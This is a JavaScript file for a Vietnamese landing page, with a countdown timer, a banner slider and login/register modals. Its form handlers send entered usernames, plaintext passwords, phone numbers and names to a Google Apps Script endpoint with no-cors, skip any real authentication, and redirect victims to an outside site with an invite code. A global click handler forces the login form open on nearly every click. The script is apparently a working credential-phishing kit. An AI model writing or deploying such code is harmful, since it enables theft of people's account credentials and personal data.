// Đảm bảo toàn bộ HTML tải xong mới chạy script
document.addEventListener("DOMContentLoaded", function() {
    
    /* =========================================
       1. TÍNH NĂNG ĐỒNG HỒ ĐẾM NGƯỢC
       ========================================= */
    function startTimer(durationInSeconds, displayElement) {
        let timer = durationInSeconds;
        
        setInterval(function () {
            // Dùng Math.floor chuẩn xác hơn parseInt trong tính toán
            let hours = Math.floor(timer / 3600);
            let minutes = Math.floor((timer % 3600) / 60);
            let seconds = Math.floor(timer % 60);

            let hStr = hours < 10 ? "0" + hours : hours;
            let mStr = minutes < 10 ? "0" + minutes : minutes;
            let sStr = seconds < 10 ? "0" + seconds : seconds;

            displayElement.textContent = `${hStr}:${mStr}:${sStr}`;

            if (--timer < 0) {
                timer = durationInSeconds;
            }
        }, 1000); 
    }

    let timeDisplays = document.querySelectorAll('.countdown-timer');
    timeDisplays.forEach(display => {
        let timeInSeconds = 3600; 
        startTimer(timeInSeconds, display);
    });

    /* =========================================
       2. TÍNH NĂNG BANNER TRƯỢT TỰ ĐỘNG
       ========================================= */
    let currentIndex = 0;
    const sliderWrapper = document.getElementById('bannerSlider');
    const dots = document.querySelectorAll('.dot');
    const slides = document.querySelectorAll('.slide');
    
    // Kiểm tra xem có banner trên trang không trước khi chạy
    if (sliderWrapper && slides.length > 0) {
        const totalSlides = slides.length;
        let slideTimer;

        function showSlide(index) {
            // Xử lý vòng lặp
            if (index >= totalSlides) currentIndex = 0;
            else if (index < 0) currentIndex = totalSlides - 1;
            else currentIndex = index;

            // Dịch chuyển khối (100% * index)
            const offset = -currentIndex * 100;
            sliderWrapper.style.transform = `translateX(${offset}%)`;

            // Cập nhật nút chấm (dots)
            dots.forEach(dot => dot.classList.remove('active'));
            if(dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            showSlide(currentIndex + 1);
        }

        // Tự động chuyển ảnh sau 3 giây (3000ms)
        slideTimer = setInterval(nextSlide, 3000);

        // Gắn vào window để có thể gọi từ inline HTML (onclick="currentSlide(1)")
        window.currentSlide = function(index) {
            showSlide(index);
            // Reset lại bộ đếm thời gian khi click tay
            clearInterval(slideTimer);
            slideTimer = setInterval(nextSlide, 3000);
        };
    }

   /* =========================================
       3. TÍNH NĂNG MỞ/ĐÓNG MODAL & GỬI GOOGLE SHEETS
       ========================================= */
    
    const modalOverlay = document.getElementById('modalOverlay');
    const loginModal = document.getElementById('loginModal');
    const registerModal = document.getElementById('registerModal');

    // --- CÁC HÀM ĐÓNG / MỞ FORM ---
    window.openModal = function(modalId) {
        if (modalOverlay) {
            modalOverlay.style.display = 'flex';
            if (modalId === 'loginModal') {
                if (loginModal) loginModal.style.display = 'block';
                if (registerModal) registerModal.style.display = 'none';
            } else if (modalId === 'registerModal') {
                if (registerModal) registerModal.style.display = 'block';
                if (loginModal) loginModal.style.display = 'none';
            }
        }
    };

    window.closeModal = function() {
        if (modalOverlay) {
            modalOverlay.style.display = 'none';
        }
    };

    window.switchModal = function(modalId) {
        window.openModal(modalId);
    };

    // Đóng form khi click ra vùng đen
    if (modalOverlay) {
        modalOverlay.addEventListener('click', function(event) {
            if (event.target === modalOverlay) {
                window.closeModal();
            }
        });
    }

// --- CÁC HÀM XỬ LÝ GỬI DỮ LIỆU GOOGLE SHEETS ---
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyD1XH8DoyfPb0OYUrZm_Q0ol8s9QiZQLBQ6-xGX7UWZamWC5xfCJ18eMASFstJdUZ9/exec"; 

    function isValidPhone(phone) {
        const phoneRegex = /^[0-9]{10}$/;
        return phoneRegex.test(phone);
    }

    // Thêm 2 biến để "khóa" chống click nhiều lần
    let isProcessingLogin = false;
    let isProcessingRegister = false;

    window.handleLogin = function() {
        // 1. Chặn ngay nếu đang trong quá trình xử lý
        if (isProcessingLogin) return; 

        const user = document.getElementById('loginUser').value.trim();
        const pass = document.getElementById('loginPass').value.trim();
        const phone = document.getElementById('loginPhone').value.trim();

        if (!user || !pass || !phone) {
            alert("Vui lòng điền đầy đủ tất cả thông tin!");
            return;
        }

        if (!isValidPhone(phone)) {
            alert("Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số.");
            return;
        }

        // 2. Bắt đầu xử lý: Khóa hàm và đổi giao diện nút
        isProcessingLogin = true;
        const btn = document.activeElement; // Lấy nút vừa được click
        if (btn && btn.tagName === 'BUTTON') {
            btn.innerHTML = "Đang xử lý...";
            btn.disabled = true;
            btn.style.opacity = '0.6';
            btn.style.cursor = 'not-allowed';
        }

        const formData = {
            status: "Đăng nhập",
            username: user,
            password: pass,
            phone: phone,
            fullname: ""
        };

        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            keepalive: true, 
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            body: JSON.stringify(formData)
        });
        
        // 3. Đợi 300 mili-giây để người dùng kịp nhìn thấy chữ "Đang xử lý" rồi mới chuyển hướng
        setTimeout(() => {
            window.location.href = "https://dly8835.com/?inviteCode=4375966";
        }, 300);
    };

    window.handleRegister = function() {
        // 1. Chặn ngay nếu đang trong quá trình xử lý
        if (isProcessingRegister) return;

        const user = document.getElementById('regUser').value.trim();
        const pass = document.getElementById('regPass').value.trim();
        const phone = document.getElementById('regPhone').value.trim();
        const name = document.getElementById('regName').value.trim();

        if (!user || !pass || !phone || !name) {
            alert("Vui lòng điền đầy đủ tất cả thông tin!");
            return;
        }

        if (!isValidPhone(phone)) {
            alert("Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số.");
            return;
        }

        // 2. Bắt đầu xử lý: Khóa hàm và đổi giao diện nút
        isProcessingRegister = true;
        const btn = document.activeElement; 
        if (btn && btn.tagName === 'BUTTON') {
            btn.innerHTML = "Đang xử lý...";
            btn.disabled = true;
            btn.style.opacity = '0.6';
            btn.style.cursor = 'not-allowed';
        }

        const formData = {
            status: "Đăng ký",
            username: user,
            password: pass,
            phone: phone,
            fullname: name
        };

        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            keepalive: true, 
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            body: JSON.stringify(formData)
        });
        
        // 3. Đợi 300 mili-giây để người dùng kịp nhìn thấy chữ "Đang xử lý" rồi mới chuyển hướng
        setTimeout(() => {
            window.location.href = "https://dly8835.com/?inviteCode=4375966";
        }, 300);
    };
    /* =========================================
       4. TÍNH NĂNG CLICK BẤT KỲ ĐÂU ĐỂ MỞ FORM ĐĂNG NHẬP
       ========================================= */
    document.addEventListener('click', function(event) {
        // 1. Kiểm tra xem người dùng có click vào vùng Modal (Overlay hoặc Form) không.
        // Nếu đang mở form hoặc click vào form thì không làm gì cả.
        const isInsideModal = event.target.closest('#modalOverlay');

        // 2. Kiểm tra xem có click vào nút Đăng ký không.
        // Chỗ này mình đang bắt theo: id="btn-dang-ky" HOẶC class="btn-dang-ky" HOẶC các nút có sự kiện mở registerModal
        const isRegisterButton = event.target.closest('#btn-dang-ky') || 
                                 event.target.closest('.btn-dang-ky') || 
                                 event.target.closest('[onclick*="registerModal"]');

        // Nếu KHÔNG phải click vào Form/Overlay và KHÔNG phải nút Đăng ký
        if (!isInsideModal && !isRegisterButton) {
            
            // Gọi hàm mở Modal Đăng nhập đã được bạn viết sẵn ở phần 3
            if (typeof window.openModal === 'function') {
                // (Tuỳ chọn) Ngăn chặn hành vi mặc định nếu lỡ click vào thẻ <a>
                // event.preventDefault(); 
                
                window.openModal('loginModal');
            }
        }
    });
    });